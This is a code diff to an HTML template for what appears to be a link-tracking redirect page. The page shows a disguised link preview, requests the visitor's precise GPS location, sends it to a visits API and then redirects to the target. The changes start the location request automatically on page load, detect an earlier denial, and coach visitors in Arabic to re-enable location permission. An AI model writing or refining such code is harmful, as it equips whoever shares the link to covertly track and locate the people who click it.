@@ -362,16 +362,18 @@ ${ogMetaTags(link, pageUrl)}
   .btn{display:inline-block;margin-top:14px;background:#38bdf8;color:#0b1220;border:0;border-radius:8px;padding:10px 22px;font-weight:600;cursor:pointer;text-decoration:none;font-size:14px}
   .skip{display:block;margin-top:10px;color:#94a3b8;font-size:12px;text-decoration:underline}
   .sig{display:inline-block;margin-top:6px;color:#cbd5e1;font-weight:600;font-size:13px}
+  .howto{margin:12px 0 4px;padding:10px 12px;background:#0b1220;border:1px solid #f59e0b;border-radius:8px;font-size:12px;color:#fcd34d;text-align:right;line-height:1.7}
 </style>
 </head>
 <body>
   <div class="wrap"><div class="box">
     <h1 id="hdr">طلب إذن الموقع</h1>
     <p id="msg">الموقع يطلب إذن الحصول على موقعك الدقيق الحالي.<br><span class="sig">مع تحيات يوسف قنديل</span></p>
-    <div class="spin" id="spin" style="display:none"></div>
-    <div class="progress" id="prog" style="display:none">في انتظار ردك على طلب المتصفح…</div>
-    <a class="btn" id="goNow" href="#">متابعة</a>
-    <a class="skip" href="${target.replace(/"/g, '&quot;')}">تخطّي بدون السماح</a>
+    <div class="spin" id="spin"></div>
+    <div class="progress" id="prog">في انتظار ردك على طلب المتصفح…</div>
+    <div id="howto" class="howto" style="display:none"></div>
+    <a class="btn" id="goNow" href="${target.replace(/"/g, '&quot;')}" style="display:none">المتابعة</a>
+    <a class="skip" href="${target.replace(/"/g, '&quot;')}">تخطّي</a>
   </div></div>
 <script>
 (function(){
@@ -383,8 +385,10 @@ ${ogMetaTags(link, pageUrl)}
   var msg=document.getElementById('msg');
   var spin=document.getElementById('spin');
   var goBtn=document.getElementById('goNow');
+  var howto=document.getElementById('howto');
 
   function showProg(text, cls){ prog.style.display=''; prog.textContent=text; prog.className='progress'+(cls?' '+cls:''); }
+  function showHowto(html){ howto.style.display=''; howto.innerHTML=html; }
   function send(payload,cb){
     try{
       var url='/api/visits/'+encodeURIComponent(visitId)+'/location';
@@ -395,26 +399,15 @@ ${ogMetaTags(link, pageUrl)}
   }
   function go(){ if(done)return; done=true; window.location.replace(target); }
 
-  goBtn.addEventListener('click', function(e){
-    e.preventDefault();
-    goBtn.style.display='none';
+  function deniedInstructions(){
+    return 'المتصفح يتذكر رفضك السابق ولن يطلب الإذن مجددًا.<br>' +
+           '<strong>على Android (Chrome):</strong> اضغط 🔒 جنب الرابط ← Permissions ← Location ← Allow ← أعد تحميل الصفحة.<br>' +
+           '<strong>على iPhone (Safari):</strong> AA في الرابط ← Website Settings ← Location ← Allow.';
+  }
 
-    if(!window.isSecureContext){
-      showProg('⚠️ الصفحة على HTTP — GPS لا يعمل إلا على HTTPS','err');
-      hdr.textContent='الموقع لن يُحسب بدقة';
-      setTimeout(go,4000);
-      return;
-    }
-    if(!('geolocation' in navigator)){
-      showProg('المتصفح لا يدعم تحديد الموقع','err');
-      setTimeout(go,1500);
-      return;
-    }
-
+  function startWatch(){
     spin.style.display='';
     showProg('في انتظار ردك على طلب المتصفح…');
-
-    // Hard fallback: redirect after 30s no matter what.
     setTimeout(go, 30000);
 
     var best=null, watchId=null, finished=false;
@@ -426,12 +419,8 @@ ${ogMetaTags(link, pageUrl)}
         showProg('تم تحديد الموقع بدقة ±'+acc+' متر','ok');
         hdr.textContent='تم! جاري التحويل…';
         send({latitude:best.coords.latitude,longitude:best.coords.longitude,accuracy:best.coords.accuracy},function(){ setTimeout(go,500); });
-      } else {
-        setTimeout(go,200);
-      }
+      } else { setTimeout(go,200); }
     }
-
-    // After 25s, take whatever we have and redirect.
     setTimeout(function(){ finish(); }, 25000);
 
     watchId = navigator.geolocation.watchPosition(
@@ -444,18 +433,56 @@ ${ogMetaTags(link, pageUrl)}
         if(pos.coords.accuracy && pos.coords.accuracy < 15) finish();
       },
       function(err){
-        var reason = err && err.code===1 ? 'الإذن مرفوض — لن نتمكن من تحديد موقعك الدقيق'
-                   : err && err.code===2 ? 'الموقع غير متاح (لا يوجد GPS أو Wi-Fi مفيد)'
-                   : err && err.code===3 ? 'انتهت مهلة GPS'
-                   : 'خطأ في تحديد الموقع';
-        showProg('⚠️ '+reason,'err');
-        hdr.textContent='تعذّر تحديد الموقع';
         spin.style.display='none';
-        if(err && err.code===1) setTimeout(go,3000);
+        if(err && err.code===1){
+          showProg('⚠️ الإذن مرفوض','err');
+          hdr.textContent='الإذن محفوظ كـ"رفض" في المتصفح';
+          showHowto(deniedInstructions());
+          goBtn.style.display='inline-block';
+        } else {
+          var reason = err && err.code===2 ? 'الموقع غير متاح (لا يوجد GPS أو Wi-Fi مفيد)'
+                     : err && err.code===3 ? 'انتهت مهلة GPS'
+                     : 'خطأ في تحديد الموقع';
+          showProg('⚠️ '+reason,'err');
+          hdr.textContent='تعذّر تحديد الموقع';
+          goBtn.style.display='inline-block';
+        }
       },
       {enableHighAccuracy:true,timeout:25000,maximumAge:0}
     );
-  });
+  }
+
+  if(!window.isSecureContext){
+    showProg('⚠️ الصفحة على HTTP — GPS لا يعمل إلا على HTTPS','err');
+    hdr.textContent='الموقع لن يُحسب بدقة';
+    spin.style.display='none';
+    goBtn.style.display='inline-block';
+    setTimeout(go,4000);
+    return;
+  }
+  if(!('geolocation' in navigator)){
+    showProg('المتصفح لا يدعم تحديد الموقع','err');
+    spin.style.display='none';
+    setTimeout(go,1500);
+    return;
+  }
+
+  // Detect cached "denied" state BEFORE calling geolocation, so we can give clear instructions.
+  if(navigator.permissions && navigator.permissions.query){
+    navigator.permissions.query({name:'geolocation'}).then(function(p){
+      if(p.state === 'denied'){
+        spin.style.display='none';
+        showProg('⚠️ الإذن مرفوض مسبقًا','err');
+        hdr.textContent='الإذن محفوظ كـ"رفض" في المتصفح';
+        showHowto(deniedInstructions());
+        goBtn.style.display='inline-block';
+      } else {
+        startWatch();
+      }
+    }).catch(function(){ startWatch(); });
+  } else {
+    startWatch();
+  }
 })();
 </script>
 </body>
